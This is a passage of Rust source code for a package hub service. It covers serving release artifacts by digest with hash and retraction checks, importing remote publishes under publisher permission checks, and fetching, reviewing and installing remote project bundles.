            ));
        };
        // A retracted release has no bytes left. Saying so is the whole point:
        // a project that pinned this coordinate reads why rather than a missing
        // file, and the reason is the publisher's own.
        if version_row.retracted_at.is_some() {
            return Err(PlatformError::new(
                "HUB_VERSION_RETRACTED",
                retraction_message(package_id, version, &version_row.retracted_reason),
            ));
        }
        let artifact_abs = self.hub_artifact_path(&version_row.artifact_rel_path)?;
        let artifact_size_bytes = fs::metadata(&artifact_abs)?.len();
        if artifact_size_bytes > MAX_REMOTE_HUB_ARTIFACT_BYTES {
            return Err(PlatformError::new(
                "HUB_ARTIFACT_TOO_LARGE",
                "hub artifact exceeds maximum read size",
            ));
        }
        let raw = fs::read(&artifact_abs)?;
        let actual_sha256 = sha256_hex(&raw);
        if actual_sha256 != version_row.artifact_sha256 {
            return Err(PlatformError::new(
                "HUB_ARTIFACT_INTEGRITY",
                format!(
                    "hub artifact hash mismatch: expected {}, got {}",
                    version_row.artifact_sha256, actual_sha256
                ),
            ));
        }
        let artifact = serde_json::from_slice::<Value>(&raw)
            .map_err(|err| PlatformError::new("HUB_INSTALL", err.to_string()))?;
        Ok((version_row, artifact, artifact_size_bytes))
    }

    /// Serves one artifact a release references, by digest.
    ///
    /// The request names the release and not only the digest, so the bytes
    /// inherit that release's visibility and its retraction: a coordinate whose
    /// bytes were withdrawn stops serving them, and knowing a digest is not a
    /// key to everything else in a shared, content-addressed store. A digest
    /// this release does not reference is not found here even when the store
    /// holds it for some other package.
    pub fn get_release_referenced_artifact(
        &self,
        package_id: &str,
        version: &str,
        sha256: &str,
    ) -> Result<(HubAssetVersion, String, Vec<u8>), PlatformError> {
        self.require_enabled()?;
        let Some(version_row) = self.hub_data.get_hub_asset_version(package_id, version)? else {
            return Err(PlatformError::new(
                "HUB_ASSET_MISSING",
                "asset version not found",
            ));
        };
        if version_row.retracted_at.is_some() {
            return Err(PlatformError::new(
                "HUB_VERSION_RETRACTED",
                retraction_message(package_id, version, &version_row.retracted_reason),
            ));
        }
        validate_artifact_digest(sha256)?;
        let artifact_abs = self.hub_artifact_path(&version_row.artifact_rel_path)?;
        let raw = fs::read(&artifact_abs)?;
        verify_hub_artifact_bytes(&raw, &version_row.artifact_sha256)?;
        let payload = parse_hub_artifact_bytes(&raw, "HUB_ARTIFACT_MISSING")?;
        let Some((entry, artifact)) = payload.files.iter().find_map(|file| match file.supply() {
            Some(HubPackageFileSupply::Referenced(artifact)) if artifact.sha256 == sha256 => {
                Some((file, artifact))
            }
            _ => None,
        }) else {
            return Err(PlatformError::new(
                "HUB_ARTIFACT_MISSING",
                format!("release {package_id}@{version} references no artifact {sha256}"),
            ));
        };
        // Resolved through the same channel an install on this instance reads,
        // so the digest is verified on the way out as well as on the way in.
        let bytes = self
            .artifact_store()
            .resolve(&entry.rel_path, artifact, entry.size_bytes)?;
        let media_type = if artifact.media_type.is_empty() {
            "application/octet-stream".to_string()
        } else {
            artifact.media_type.clone()
        };
        Ok((version_row, media_type, bytes))
    }

    pub fn get_latest_asset_media(
        &self,
        package_id: &str,
        media_name: &str,
    ) -> Result<(HubAssetPackage, HubAssetMedia, Vec<u8>), PlatformError> {
        self.require_enabled()?;
        let Some(package) = self.hub_data.get_hub_asset_package(package_id)? else {
            return Err(PlatformError::new(
                "HUB_ASSET_MISSING",
                "asset package not found",
            ));
        };
        // Presentation lives beside the releases, so a cover resolves from the
        // package row and the artifact store without opening any release
        // document — and stays reachable when a typo is corrected.
        let Some(media) = package
            .media
            .iter()
            .find(|item| item.name == media_name)
            .cloned()
        else {
            return Err(PlatformError::new("HUB_MEDIA_MISSING", "media not found"));
        };
        let bytes = self.artifact_store().resolve(
            &media.name,
            &HubPackageArtifactRef {
                sha256: media.artifact_sha256.clone(),
                media_type: media.content_type.clone(),
            },
            media.size_bytes,
        )?;
        Ok((package, media, bytes))
    }

    pub fn import_remote_asset(
        &self,
        authority_owner: &str,
        authority_project: &str,
        token: &HubToken,
        req: &RemoteHubPublishRequest,
    ) -> Result<(HubAssetPackage, HubAssetVersion), PlatformError> {
        let _ = (authority_owner, authority_project);
        self.require_enabled()?;
        let authority_owner = HUB_SERVICE_SCOPE_OWNER.to_string();
        let authority_project = HUB_SERVICE_SCOPE_PROJECT.to_string();
        let publisher_owner = slug_segment(&token.owner);
        let publisher_id = slug_segment(&token.publisher_id);
        let package_id = canonical_hub_package_id(&publisher_id, &req.package_id)?;
        let version = req.version.trim().to_string();
        if authority_owner.is_empty()
            || authority_project.is_empty()
            || publisher_owner.is_empty()
            || publisher_id.is_empty()
            || package_id.is_empty()
            || version.is_empty()
        {
            return Err(PlatformError::new(
                "HUB_REMOTE_INVALID",
                "authority, publisher, package id, and version must not be empty",
            ));
        }
        validate_hub_version(&version)?;
        let Some(publisher) = self.hub_data.get_hub_publisher(
            HUB_SERVICE_SCOPE_OWNER,
            HUB_SERVICE_SCOPE_PROJECT,
            &publisher_id,
        )?
        else {
            return Err(PlatformError::new(
                "HUB_PUBLISHER_MISSING",
                "publisher not found",
            ));
        };
        if !publisher.enabled {
            return Err(PlatformError::new(
                "HUB_PUBLISHER_DISABLED",
                "publisher is disabled",
            ));
        }
        if !publisher.can_publish {
            return Err(PlatformError::new(
                "HUB_PUBLISHER_FORBIDDEN",
                "publisher does not have publish permission",
            ));
        }
        // The remote publish route lands here, and it carries the same
        // release-immutability rule as a local publish. Checked before the
        // inbound document is decoded, so nothing durable is written.
        self.enforce_release_immutability(&package_id, &version)?;
        let existing_package = self.hub_data.get_hub_asset_package(&package_id)?;
        let source_owner = slug_segment(&req.source_owner);
        let source_project = slug_segment(&req.source_project);
        let mut artifact = parse_hub_artifact_value(req.artifact.clone(), "HUB_REMOTE_INVALID")?;
        if artifact.files.is_empty() {
            return Err(PlatformError::new(
                "HUB_REMOTE_INVALID",
                "artifact must contain at least one file",
            ));
        }
        // Presentation arrives beside the release, not inside it. Its images
        // are validated, then stored content-addressed so only a digest is
        // recorded against the package.
        //
        // What the request does not carry is left as it is. A remote publish of
        // a new version says nothing about presentation by sending it empty,
        // and blanking a description or dropping a cover on that basis is the
        // coupling the presentation split removed.
        let decoded_media = decode_remote_hub_media(&req.media, &publisher)?;
        let incoming_media = decoded_media
            .iter()
            .map(|(item, _)| item.clone())
            .collect::<Vec<_>>();
        let incoming_gallery = req.gallery.cover.is_some() || !req.gallery.items.is_empty();
        let mut presentation = HubPresentation::from_existing(existing_package.as_ref());
        if !req.summary.trim().is_empty() {
            presentation.summary = req.summary.trim().to_string();
        }
        if !req.description_md.trim().is_empty() {
            presentation.description_md = req.description_md.clone();
        }
        if !incoming_media.is_empty() {
            presentation.media = incoming_media;
        }
        if incoming_gallery {
            validate_hub_gallery(&req.gallery, &presentation.media)?;
            presentation.gallery = req.gallery.clone();
        }
        if !decoded_media.is_empty() || incoming_gallery {
            presentation.image_url = presentation
                .gallery
                .cover
                .as_ref()
                .map(|item| {
                    format!(
                        "/api/hub/remote/assets/{package_id}/media/{}",
                        item.media_name
                    )
                })
                .or_else(|| {
                    presentation
                        .media
                        .iter()
                        .find(|item| item.role == "cover")
                        .map(|item| {
                            format!("/api/hub/remote/assets/{package_id}/media/{}", item.name)
                        })
                })
                .unwrap_or_default();
        }
        sanitize_hub_export_entries(&mut artifact.files)?;
        // The remote publish route is a publish, so it refuses what a local
        // publish refuses. This hub would serve the release to installers who
        // all refuse it, and the coordinate it burns is burned here rather
        // than on the instance the document came from -- where the publisher
        // cannot retract it. It is not a hub judging a peer's catalogue: the
        // token authenticates a publisher registered here, pushing their own
        // package to this hub.
        //
        // Reviewed against the layout the document records and this store,
        // because those are what a receiver installing *from this hub* reads:
        // `review_asset_install` and `install_asset` both resolve references
        // through the same channel.
        refuse_publish_violations(
            "HUB_REMOTE_PUBLISH_REFUSED",
            &review_publish_entries(
                &publisher_layout(&artifact),
                &artifact.asset_kind,
                &artifact.files,
                Vec::new(),
                &artifact.title,
                &artifact.description,
                !decoded_media.is_empty(),
                &self.artifact_store(),
            ),
        )?;
        let artifact_rel = format!(
            "services/{}/packages/{}/versions/{}/artifact.json",
            DEFAULT_HUB_SERVICE_INSTANCE_ID, package_id, version
        );
        let artifact_abs = self.data_root.join(&artifact_rel);
        if let Some(parent) = artifact_abs.parent() {
            fs::create_dir_all(parent)?;
        }
        let artifact_bytes =
            encode_hub_artifact(&package_id, &version, &artifact, "HUB_REMOTE_INVALID")?;
        let artifact_value = serde_json::from_slice(&artifact_bytes)
            .map_err(|err| PlatformError::new("HUB_REMOTE_INVALID", err.to_string()))?;
        let now = now_ts();
        let authority = self.ensure_service_authority()?;
        self.enforce_publisher_package_quota(
            &publisher,
            &package_id,
            existing_package.as_ref(),
            artifact_bytes.len(),
        )?;
        atomic_write(&artifact_abs, &artifact_bytes)?;
        for (item, bytes) in &decoded_media {
            let stored = self.store_artifact(bytes)?;
            if stored != item.artifact_sha256 {
                return Err(PlatformError::new(
                    "HUB_MEDIA_INVALID",
                    "stored media digest does not match the declared hash",
                ));
            }
        }
        let package = HubAssetPackage {
            package_pk: existing_package
                .as_ref()
                .map(|item| item.package_pk.clone())
                .filter(|value| !value.is_empty())
                .unwrap_or_else(|| format!("mpkg_{}", random_hex(8))),
            authority_id: authority.authority_id.clone(),
            publisher_pk: publisher.publisher_pk.clone(),
            package_id: package_id.clone(),
            authority_owner: authority_owner.clone(),
            authority_project: authority_project.clone(),
            publisher_owner: publisher_owner.clone(),
            publisher_id: publisher_id.clone(),
            publisher_display_name: publisher.display_name.clone(),
            publisher_url: publisher.publisher_url.clone(),
            publisher_email: publisher.email.clone(),
            asset_kind: validate_hub_asset_kind(&artifact.asset_kind)?,
            title: if req.title.trim().is_empty() {
                artifact.title.clone()
            } else {
                req.title.trim().to_string()
            },
            description: if req.description.trim().is_empty() {
                artifact.description.clone()
            } else {
                req.description.trim().to_string()
            },
            summary: presentation.summary,
            description_md: presentation.description_md,
            image_url: presentation.image_url,
            media: presentation.media,
            gallery: presentation.gallery,
            visibility: normalize_visibility(&req.visibility),
            tags: req.tags.clone(),
            // See the local publish path: a live release makes the package live
            // again, and the retracted version rows keep their own markers.
            retracted_at: None,
            retracted_reason: String::new(),
            created_at: existing_package.map(|item| item.created_at).unwrap_or(now),
            updated_at: now,
        };
        let version_row = HubAssetVersion {
            package_pk: package.package_pk.clone(),
            package_id,
            version,
            authority_owner,
            authority_project,
            publisher_owner,
            publisher_id,
            source_owner,
            source_project,
            source_kind: req.source_kind.clone(),
            source_ref: req.source_ref.clone(),
            artifact_rel_path: artifact_rel,
            artifact_sha256: sha256_hex(&artifact_bytes),
            manifest: artifact_value,
            retracted_at: None,
            retracted_reason: String::new(),
            // New row by construction — see the note on the local publish path.
            created_at: now,
        };
        self.hub_data.put_hub_asset_package(&package)?;
        self.hub_data.put_hub_asset_version(&version_row)?;
        Ok((package, version_row))
    }

    pub async fn fetch_remote_pack_rows(
        &self,
        http_client: &reqwest::Client,
        owner: &str,
        project: &str,
    ) -> Result<Vec<HubRemotePackRow>, PlatformError> {
        let repos = self.list_effective_repositories(owner, project)?;
        let mut out = Vec::new();
        for repo in repos.into_iter().filter(|item| item.enabled) {
            let url = remote_hub_url(&repo, "remote/assets");
            validate_remote_hub_url(&url)?;
            let mut req = http_client.get(url);
            if !repo.read_token.trim().is_empty() {
                req = req.bearer_auth(repo.read_token.trim());
            }
            let response = req
                .send()
                .await
                .map_err(|err| PlatformError::new("HUB_REMOTE_FETCH", err.to_string()))?;
            if !response.status().is_success() {
                continue;
            }
            let payload: RemoteHubListResponse = response
                .json()
                .await
                .map_err(|err| PlatformError::new("HUB_REMOTE_FETCH", err.to_string()))?;
            out.extend(payload.items.into_iter().map(|item| HubRemotePackRow {
                repository_id: repo.repository_id.clone(),
                repository_title: repo.title.clone(),
                package_id: item.package_id,
                publisher_owner: item.publisher_owner,
                publisher_id: item.publisher_id,
                publisher_display_name: item.publisher_display_name,
                publisher_url: item.publisher_url,
                publisher_email: item.publisher_email,
                asset_kind: item.asset_kind,
                title: item.title,
                description: item.description,
                summary: item.summary,
                image_url: item.image_url,
                gallery: item.gallery,
                visibility: item.visibility,
                tags: item.tags,
                latest_version: item.latest_version,
                updated_at: item.updated_at,
                source: "remote".to_string(),
            }));
        }
        Ok(out)
    }

    pub async fn fetch_platform_remote_app_rows(
        &self,
        http_client: &reqwest::Client,
        owner: &str,
    ) -> Result<Vec<HubRemotePackRow>, PlatformError> {
        let repos = self.list_platform_repositories(owner)?;
        self.fetch_platform_remote_app_rows_from_repositories(http_client, repos)
            .await
    }

    pub async fn fetch_platform_remote_app_rows_from_repositories(
        &self,
        http_client: &reqwest::Client,
        repos: Vec<PlatformHubRepository>,
    ) -> Result<Vec<HubRemotePackRow>, PlatformError> {
        let mut out = Vec::new();
        for repo in repos.into_iter().filter(|item| item.enabled) {
            let url = remote_hub_url_for_platform(&repo, "remote/assets");
            validate_remote_hub_url(&url)?;
            let mut req = http_client.get(url);
            if !repo.read_token.trim().is_empty() {
                req = req.bearer_auth(repo.read_token.trim());
            }
            let response = match req.send().await {
                Ok(response) => response,
                Err(_) => continue,
            };
            if !response.status().is_success() {
                continue;
            }
            let payload: RemoteHubListResponse = match response.json().await {
                Ok(payload) => payload,
                Err(_) => continue,
            };
            out.extend(
                payload
                    .items
                    .into_iter()
                    .filter(|item| item.asset_kind == HUB_ASSET_KIND_PROJECT_BUNDLE)
                    .map(|item| HubRemotePackRow {
                        repository_id: repo.repository_id.clone(),
                        repository_title: repo.title.clone(),
                        package_id: item.package_id,
                        publisher_owner: item.publisher_owner,
                        publisher_id: item.publisher_id,
                        publisher_display_name: item.publisher_display_name,
                        publisher_url: item.publisher_url,
                        publisher_email: item.publisher_email,
                        asset_kind: item.asset_kind,
                        title: item.title,
                        description: item.description,
                        summary: item.summary,
                        image_url: item.image_url,
                        gallery: item.gallery,
                        visibility: item.visibility,
                        tags: item.tags,
                        latest_version: item.latest_version,
                        updated_at: item.updated_at,
                        source: "remote".to_string(),
                    }),
            );
        }
        Ok(out)
    }

    pub async fn install_remote_pack_from_repository(
        &self,
        http_client: &reqwest::Client,
        target_owner: &str,
        target_project: &str,
        repository_id: &str,
        package_id: &str,
        version: &str,
        target_folder: &str,
    ) -> Result<HubInstallResult, PlatformError> {
        let repo = self
            .list_effective_repositories(target_owner, target_project)?
            .into_iter()
            .find(|item| item.repository_id == repository_id)
            .ok_or_else(|| PlatformError::new("HUB_REPOSITORY_MISSING", "repository not found"))?;
        let url = remote_hub_url(
            &repo,
            &format!("remote/assets/{}/{}/artifact", package_id, version),
        );
        validate_remote_hub_url(&url)?;
        let mut req = http_client.get(url);
        if !repo.read_token.trim().is_empty() {
            req = req.bearer_auth(repo.read_token.trim());
        }
        let response = req
            .send()
            .await
            .map_err(|err| PlatformError::new("HUB_REMOTE_FETCH", err.to_string()))?;
        if !response.status().is_success() {
            return Err(PlatformError::new(
                "HUB_REMOTE_FETCH",
                format!("remote fetch failed with {}", response.status()),
            ));
        }
        let payload: RemoteHubArtifactResponse = response
            .json()
            .await
            .map_err(|err| PlatformError::new("HUB_REMOTE_FETCH", err.to_string()))?;
        verify_remote_artifact_hash(&payload)?;
        let artifact = parse_hub_artifact_value(payload.artifact, "HUB_REMOTE_INVALID")?;
        // Every referenced artifact is fetched and verified before the install
        // reaches the project, so a reference that cannot be obtained refuses
        // here rather than half-way through writing files.
        let artifacts = self
            .remote_artifact_channel(
                &artifact.files,
                &repo.title.clone().if_empty_then(|| repo.base_url.clone()),
                &repo.read_token,
                |sha256| {
                    remote_hub_url(&repo, &remote_artifact_suffix(package_id, version, sha256))
                },
            )
            .await?;
        self.install_artifact_payload_from(
            slug_segment(target_owner),
            slug_segment(target_project),
            package_id,
            version,
            target_folder,
            &format!("{repository_id}/{package_id}"),
            artifact,
            &artifacts,
        )
    }

    pub async fn review_remote_pack_from_repository(
        &self,
        http_client: &reqwest::Client,
        target_owner: &str,
        target_project: &str,
        repository_id: &str,
        package_id: &str,
        version: &str,
        target_folder: &str,
    ) -> Result<HubInstallReview, PlatformError> {
        let repo = self
            .list_effective_repositories(target_owner, target_project)?
            .into_iter()
            .find(|item| item.repository_id == repository_id)
            .ok_or_else(|| PlatformError::new("HUB_REPOSITORY_MISSING", "repository not found"))?;
        let url = remote_hub_url(
            &repo,
            &format!("remote/assets/{}/{}/artifact", package_id, version),
        );
        validate_remote_hub_url(&url)?;
        let mut req = http_client.get(url);
        if !repo.read_token.trim().is_empty() {
            req = req.bearer_auth(repo.read_token.trim());
        }
        let response = req
            .send()
            .await
            .map_err(|err| PlatformError::new("HUB_REMOTE_FETCH", err.to_string()))?;
        if !response.status().is_success() {
            return Err(PlatformError::new(
                "HUB_REMOTE_FETCH",
                format!("remote fetch failed with {}", response.status()),
            ));
        }
        let payload: RemoteHubArtifactResponse = response
            .json()
            .await
            .map_err(|err| PlatformError::new("HUB_REMOTE_FETCH", err.to_string()))?;
        verify_remote_artifact_hash(&payload)?;
        let artifact = parse_hub_artifact_value(payload.artifact, "HUB_REMOTE_INVALID")?;
        // The review fetches what the install would fetch, so what it scans is
        // what would land. It reports rather than writes, and the fetch touches
        // only the shared artifact cache.
        let artifacts = self
            .remote_artifact_channel(
                &artifact.files,
                &repo.title.clone().if_empty_then(|| repo.base_url.clone()),
                &repo.read_token,
                |sha256| {
                    remote_hub_url(&repo, &remote_artifact_suffix(package_id, version, sha256))
                },
            )
            .await?;
        self.review_artifact_payload(
            &slug_segment(target_owner),
            &slug_segment(target_project),
            package_id,
            version,
            target_folder,
            &artifact,
            &artifacts,
        )
    }

    pub async fn install_remote_project_from_platform_repository(
        &self,
        http_client: &reqwest::Client,
        owner: &str,
        repository_id: &str,
        package_id: &str,
        version: &str,
        scope: HubInstallScope,
    ) -> Result<ProjectBundleInstallResult, PlatformError> {
        self.install_remote_project_from_platform_source(
            http_client,
            owner,
            owner,
            repository_id,
            package_id,
            version,
            scope,
        )
        .await
    }

    #[allow(clippy::too_many_arguments)]
    pub async fn install_remote_project_from_platform_source(
        &self,
        http_client: &reqwest::Client,
        source_owner: &str,
        target_owner: &str,
        repository_id: &str,
        package_id: &str,
        version: &str,
        scope: HubInstallScope,
    ) -> Result<ProjectBundleInstallResult, PlatformError> {
        // A contradictory scope is a request error, so it costs no download.
        scope.validate()?;
        let target_owner = slug_segment(target_owner);
        let (repo, artifact) = self
            .fetch_platform_project_bundle(
                http_client,
                source_owner,
                repository_id,
                package_id,
                version,
            )
            .await?;
        // The bundle's referenced bytes live at the hub that served the
        // document, and are fetched and verified before the project exists.
        let artifacts = self
            .remote_artifact_channel(
                &artifact.files,
                &repo.title.clone().if_empty_then(|| repo.base_url.clone()),
                &repo.read_token,
                |sha256| {
                    remote_hub_url_for_platform(
                        &repo,
                        &remote_artifact_suffix(package_id, version, sha256),
                    )
                },
            )
            .await?;
        self.install_project_bundle(&target_owner, package_id, &artifact, &artifacts, scope)
    }

    pub async fn review_remote_project_from_platform_repository(
        &self,
        http_client: &reqwest::Client,
        owner: &str,
        repository_id: &str,
        package_id: &str,
        version: &str,
        scope: HubInstallScope,
    ) -> Result<ProjectBundleInstallReview, PlatformError> {
        self.review_remote_project_from_platform_source(
            http_client,
            owner,
            owner,
            repository_id,
            package_id,
            version,
            scope,
        )
        .await
    }

    /// Reports what installing this project bundle would do, without doing any
    /// of it.
    ///
    /// It fetches the same document the install fetches and hands it to the
    /// same planner, so the destinations, registrations, activations and SQL
    /// reported here are the ones the install performs, not a second reading of
    /// the package.
    #[allow(clippy::too_many_arguments)]
    pub async fn review_remote_project_from_platform_source(
        &self,
        http_client: &reqwest::Client,
        source_owner: &str,
        target_owner: &str,
        repository_id: &str,
        package_id: &str,
        version: &str,
        scope: HubInstallScope,
    ) -> Result<ProjectBundleInstallReview, PlatformError> {
        scope.validate()?;
        let target_owner = slug_segment(target_owner);
        let (repo, artifact) = self
            .fetch_platform_project_bundle(
                http_client,
                source_owner,
                repository_id,
                package_id,
                version,
            )
            .await?;
        let artifacts = self
            .remote_artifact_channel(
                &artifact.files,
                &repo.title.clone().if_empty_then(|| repo.base_url.clone()),
                &repo.read_token,
                |sha256| {
                    remote_hub_url_for_platform(
                        &repo,
                        &remote_artifact_suffix(package_id, version, sha256),
                    )
                },
            )
            .await?;
        self.review_project_bundle(
            &target_owner,
            package_id,
            version,
            &artifact,
            &artifacts,
            scope,
        )
    }

    /// Fetches one package document from a platform repository.
    ///
    /// Split from what follows it so that reviewing and installing read the
    /// same bytes through the same code, and so neither the review nor a
    /// failed fetch can act on the target.
    async fn fetch_platform_project_bundle(
        &self,
        http_client: &reqwest::Client,
        source_owner: &str,
        repository_id: &str,
        package_id: &str,
        version: &str,
    ) -> Result<(PlatformHubRepository, HubPackageSpec), PlatformError> {
        let source_owner = slug_segment(source_owner);
        let repo = self
            .list_platform_repositories(&source_owner)?
            .into_iter()
            .find(|item| item.repository_id == repository_id)
            .ok_or_else(|| PlatformError::new("HUB_REPOSITORY_MISSING", "repository not found"))?;
        let url = remote_hub_url_for_platform(
            &repo,
            &format!("remote/assets/{}/{}/artifact", package_id, version),
        );
        validate_remote_hub_url(&url)?;
        let mut req = http_client.get(url);
        if !repo.read_token.trim().is_empty() {
            req = req.bearer_auth(repo.read_token.trim());
        }
        let response = req
            .send()
            .await
            .map_err(|err| PlatformError::new("HUB_REMOTE_FETCH", err.to_string()))?;
        if !response.status().is_success() {
            return Err(PlatformError::new(
                "HUB_REMOTE_FETCH",
                format!("remote fetch failed with {}", response.status()),
            ));
        }
        let payload: RemoteHubArtifactResponse = response
            .json()
            .await
            .map_err(|err| PlatformError::new("HUB_REMOTE_FETCH", err.to_string()))?;
        verify_remote_artifact_hash(&payload)?;
        let artifact = parse_hub_artifact_value(payload.artifact, "HUB_REMOTE_INVALID")?;
        // The repository travels back with the document: whichever of the two
        // callers asked, the referenced bytes have to be fetched from the same
        // hub that served it.
        Ok((repo, artifact))
    }

    /// Installs a project bundle into a project this call creates.
    ///
    /// Split from the fetch so the install is reachable without a network, and
    /// so every caller runs the same gate in the same order. Everything it does
    /// is decided by [`ProjectBundleInstallPlan`] before the project exists;
    /// this executes that plan and reports it back.
    fn install_project_bundle(
        &self,
        target_owner: &str,
        package_id: &str,
        artifact: &HubPackageSpec,
        artifacts: &HubArtifactChannel,
        scope: HubInstallScope,
    ) -> Result<ProjectBundleInstallResult, PlatformError> {
        let target_owner = slug_segment(target_owner);
        let base_project = project_bundle_base_slug(package_id)?;
        let plan = ProjectBundleInstallPlan::build(artifact, artifacts, scope)?;
        let prepared = plan.accept()?;

        let project_title = if artifact.title.trim().is_empty() {
            package_id.to_string()
        } else {
            artifact.title.clone()
        };
        // The bundle's own documents are rewritten to name the project before
        // that project is created, so a bundle that cannot be retargeted leaves
        // no half-filled project behind.
        let mut suffix = 1usize;
        let (project, entries) = loop {
            let candidate = project_bundle_slug_candidate(&base_project, suffix);
            if self
                .control_data
                .get_project(&target_owner, &candidate)?
                .is_some()
            {
                suffix += 1;
                continue;
            }
            let entries = prepared.retargeted_entries(&candidate)?;
            match self.projects.create_or_update_project(
                &target_owner,
                &CreateProjectRequest {
                    project: candidate.clone(),
                    title: Some(project_title.clone()),
                    local_branch: None,
                    runtime: ProjectRuntimeSelectionRequest::default(),
                },
            ) {
                Ok(_) => break (candidate, entries),
                Err(err)
                    if err.code == "PLATFORM_GIT_INIT"
                        || err.code == "PROJECT_EXISTS"
                        || err.code == "PLATFORM_PROJECT_EXISTS" =>
                {
                    suffix += 1;
                    continue;
                }
                Err(err) => return Err(err),
            }
        };
        let layout = self.projects.project_layout(&target_owner, &project)?;
        clear_repo_worktree_preserving_git(&layout.repo_dir)?;
        for entry in &entries {
            let dest_abs = sanitize_install_repo_path(&layout, &entry.destination)?;
            if let Some(parent) = dest_abs.parent() {
                fs::create_dir_all(parent)?;
            }
            atomic_write(&dest_abs, &entry.bytes)?;
        }
        for registration in &prepared.registrations {
            self.projects.upsert_pipeline_definition(
                &target_owner,
                &project,
                &registration.identity,
                "",
                &registration.description,
                &registration.trigger_kind,
                &registration.source,
            )?;
        }
        if scope.execute_schema {
            sekejap::apply_schema_from_repo(&self.data_root, &target_owner, &project)?;
            sqlite_schema::apply_schema_from_repo(
                &self.data_root,
                &target_owner,
                &project,
                &layout.repo_layout,
            )?;
            execute_project_initial_data(
                &self.data_root,
                &target_owner,
                &project,
                &layout,
                &plan.initial_data,
            )?;
        }
        for identity in &prepared.pipelines_activated {
            self.projects
                .activate_pipeline_definition(&target_owner, &project, identity)?;
        }
        Ok(ProjectBundleInstallResult {
            owner: target_owner,
            project,
            scope,
            files_written: plan.destinations.clone(),
            skipped_files: plan.skipped_files.clone(),
            pipelines_registered: prepared.pipeline_identities(),
            pipelines_activated: prepared.pipelines_activated.clone(),
            pipelines_not_activated: prepared.pipelines_not_activated.clone(),
            unexecuted_initial_data: plan.unexecuted_initial_data.clone(),
            schema_executed: scope.execute_schema,
            database_initialization: plan.database_initialization.clone(),
        })
    }

    /// Reports what [`install_project_bundle`] would do, having done none of it.
    ///
    /// Every action it names is read out of the same plan the install executes,
    /// so a review that calls a package installable is followed by an install
    /// that installs exactly what was shown. Nothing here writes: the project
    /// named below does not exist yet.
    ///
    /// [`install_project_bundle`]: HubService::install_project_bundle
    fn review_project_bundle(
        &self,
        target_owner: &str,
        package_id: &str,
        version: &str,
        artifact: &HubPackageSpec,
        artifacts: &HubArtifactChannel,
        scope: HubInstallScope,
    ) -> Result<ProjectBundleInstallReview, PlatformError> {
        let target_owner = slug_segment(target_owner);
        let base_project = project_bundle_base_slug(package_id)?;
        let plan = ProjectBundleInstallPlan::build(artifact, artifacts, scope)?;

        let mut suffix = 1usize;
        let project = loop {
            let candidate = project_bundle_slug_candidate(&base_project, suffix);
            if self
                .control_data
                .get_project(&target_owner, &candidate)?
                .is_none()
            {
                break candidate;
            }
            suffix += 1;
        };
        let safety = plan.safety.clone();
        Ok(ProjectBundleInstallReview {
            package_id: package_id.to_string(),
            version: version.to_string(),
            asset_kind: artifact.asset_kind.clone(),
            owner: target_owner,
            project,
            scope,
            files_written: plan.destinations.clone(),
            skipped_files: plan.skipped_files.clone(),
            pipelines_registered: plan.pipeline_identities(),
            pipelines_activated: plan.pipelines_activated(),
            pipelines_not_activated: plan.pipelines_not_activated(),
            schema_executed: scope.execute_schema,
            unexecuted_initial_data: plan.unexecuted_initial_data.clone(),
            database_initialization: plan.database_initialization.clone(),
            project_initialization: serde_json::to_value(&artifact.project_initialization)
                .unwrap_or(Value::Null),
            nodes_used: safety.nodes_used,
            credentials_required: safety.credentials_required,
            external_urls: safety.external_urls,
            database_effects: safety.database_effects,
            filesystem_effects: safety.filesystem_effects,
            network_effects: safety.network_effects,
            code_execution: safety.code_execution,
            public_endpoints: safety.public_endpoints,
            schedules: safety.schedules,
            large_files: safety.large_files,
            seed_data: safety.seed_data,
            warnings: safety.warnings,
            installable: safety.violations.is_empty(),
            violations: safety.violations,
            // A project bundle is installed into a project this call creates,
            // so there is nothing of the user's for it to overwrite.
            risk_level: install_risk_level(&plan.safety, false),
        })
    }

    fn preview_pipeline(
        &self,
        owner: &str,
        project: &str,
        layout: &ProjectFileLayout,
        source_ref: &str,
    ) -> Result<HubExportPreview, PlatformError> {
        let Some(meta) = self
            .projects
            .get_pipeline_meta_by_file_id(owner, project, source_ref)?
        else {
            return Err(PlatformError::new(
                "HUB_PUBLISH_MISSING",
                format!("pipeline '{}' not found", source_ref),
            ));
        };
        let mut warnings = Vec::new();
        // A manifest entry names a file inside the repository, while identity
        // names one inside the source root, so the root is added back here.
        let pipeline_repo_rel = layout.repo_layout.source_rel(&meta.file_rel_path);
        let mut entries = vec![read_repo_entry(
            layout,
            &pipeline_repo_rel,
            "primary pipeline".to_string(),
        )?];
        let source = self
            .projects
            .read_pipeline_source(owner, project, &meta.file_rel_path)?;
        // Read through the contract rather than by poking at the raw JSON: a
        // stored pipeline is an envelope whose nodes live under `spec`, so a
        // top-level `nodes` lookup found none of them and published a bundle
        // without the page its own web response renders.
        let document = decode_pipeline_graph(source.as_bytes()).map_err(|error| {
            PlatformError::new(
                "HUB_PREVIEW",
                format!("invalid pipeline '{}': {error}", meta.file_rel_path),
            )
        })?;
        let mut seen = BTreeSet::new();
        seen.insert(pipeline_repo_rel);
        for node in &document.spec.nodes {
            if node.kind != "n.web.response" {
                continue;
            }
            let Some(template_rel) = node.config.get("template").and_then(Value::as_str) else {
                continue;
            };
            self.collect_template_dependency_entries(
                layout,
                template_rel,
                "web response template".to_string(),
                &mut seen,
                &mut entries,
                &mut warnings,
            )?;
        }
        entries.sort_by(|a, b| a.rel_path.cmp(&b.rel_path));
        Ok(build_preview(
            HUB_ASSET_KIND_PIPELINE_BUNDLE.to_string(),
            "pipeline_with_dependencies".to_string(),
            meta.file_rel_path.clone(),
            meta.title,
            if meta.description.trim().is_empty() {
                "Pipeline export with local project dependencies".to_string()
            } else {
                meta.description
            },
            entries,
            warnings,
        ))
    }

    fn preview_template(
        &self,
        owner: &str,
        project: &str,
        layout: &ProjectFileLayout,
        source_ref: &str,
    ) -> Result<HubExportPreview, PlatformError> {
        let listing = self.projects.list_template_workspace(owner, project)?;
        let selected = listing
            .items
            .into_iter()
            .find(|item| item.kind != "folder" && item.rel_path == source_ref)
            .ok_or_else(|| {
                PlatformError::new(
                    "HUB_PUBLISH_MISSING",
                    format!("template '{}' not found", source_ref),
                )
            })?;
        let mut warnings = Vec::new();
        let mut entries = Vec::new();
        let mut seen = BTreeSet::new();
        self.collect_template_dependency_entries(
            layout,
            &selected.rel_path,
            "primary template".to_string(),
            &mut seen,
            &mut entries,
            &mut warnings,
        )?;
        entries.sort_by(|a, b| a.rel_path.cmp(&b.rel_path));
        Ok(build_preview(
